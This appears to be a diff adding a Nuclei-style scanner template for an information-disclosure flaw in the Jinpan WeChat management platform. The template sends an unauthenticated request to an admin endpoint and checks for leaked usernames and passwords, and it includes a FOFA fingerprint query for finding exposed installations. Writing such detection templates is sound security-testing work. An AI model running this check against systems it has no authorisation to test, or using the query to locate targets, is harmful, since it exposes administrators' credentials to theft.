@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - part: status_code
+          status:
+            - 200
+          type: status
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"id":1,'
+            - '"username":'
+            - '"password":'
+      matchers-condition: and
+      raw:
+        - |
+          GET /admin/weichatcfg/getsysteminfo HTTP/1.1
+          Host: {{Hostname}}
+id: jinpan-weichatcfg-disclosure
+info:
+    author: SleepingBag945
+    description: |
+        FOFA: icon_hash="116323821" && title=="微信管理后台"
+    name: 金盘微信管理平台 getsysteminfo信息泄露
+    severity: high
+    tags:
+        - jinpan
